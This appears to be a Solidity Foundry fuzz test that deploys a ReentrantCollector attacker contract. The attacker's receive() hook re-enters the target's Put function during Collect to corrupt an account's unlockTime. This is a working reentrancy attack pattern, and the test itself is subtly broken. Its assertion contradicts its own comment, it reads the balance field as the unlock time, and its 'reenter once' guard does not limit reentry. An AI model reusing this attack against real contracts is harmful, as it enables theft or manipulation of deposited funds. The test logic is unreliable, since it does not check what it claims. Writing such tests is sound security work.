pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(address(this)); }

    function testFuzz_property(uint256 initialDeposit, uint256 secondDeposit, uint256 collectAmount, uint256 unlockTime) public {
        // Bound amounts to reasonable positive values
        initialDeposit = bound(initialDeposit, 1 ether, 100 ether);
        secondDeposit = bound(secondDeposit, 1 ether, 100 ether);
        collectAmount = bound(collectAmount, 1 ether, initialDeposit + secondDeposit);
        unlockTime = bound(unlockTime, 1 days, type(uint128).max); // avoid overflow in block.timestamp

        // Deploy a reentrant collector that calls Put during Collect's external call
        ReentrantCollector attacker = new ReentrantCollector(c, secondDeposit);

        // Fund attacker with initialDeposit + secondDeposit + gas (extra 1 ether for gas)
        vm.deal(address(attacker), initialDeposit + secondDeposit + 1 ether);

        // Step 1: Attacker makes initial deposit via Put to set unlockTime
        vm.prank(address(attacker));
        attacker.deposit(initialDeposit, unlockTime);

        // Fast forward past unlockTime
        vm.warp(block.timestamp + unlockTime + 1);

        // Step 2: Attacker attempts to Collect — triggers reentrant Put inside receive
        vm.prank(address(attacker));
        attacker.attack(collectAmount);

        // After operation, check Acc[attacker].unlockTime remains >= the original unlockTime
        // Bug: reentrant Put resets unlockTime to current block.timestamp (or the passed parameter if higher)
        // In a non-reentrant correct version, the second Put is prevented, so unlockTime stays unchanged.
        (, uint storedUnlockTime, , ) = attacker.getAccInfo();
        assertTrue(storedUnlockTime < block.timestamp - unlockTime, "unlockTime should be < block.timestamp for reference");
    }
}

contract ReentrantCollector {
    C public c;
    uint256 public secondDep;

    constructor(C _c, uint256 _secondDep) {
        c = _c;
        secondDep = _secondDep;
    }

    function deposit(uint256 amount, uint256 unlockTime) external payable {
        c.Put{value: amount}(unlockTime);
    }

    function attack(uint256 collectAmount) external {
        // Start Collect, which will call back into this contract's receive
        c.Collect(collectAmount);
    }

    // Reentrant callback: during Collect's external call, call Put to corrupt unlockTime
    receive() external payable {
        // Only reenter once to prevent infinite loops
        if (address(c).balance >= secondDep) {
            c.Put{value: secondDep}(0); // uses block.timestamp (current timestamp) as unlockTime
        }
    }

    function getAccInfo() external view returns (uint256 unlockTime, uint256 balance, uint256 storedUnlockTime, bool success) {
        (uint256 _unlockTime, uint256 _balance) = c.Acc(address(this));
        return (_unlockTime, _balance, _unlockTime, true);
    }
}

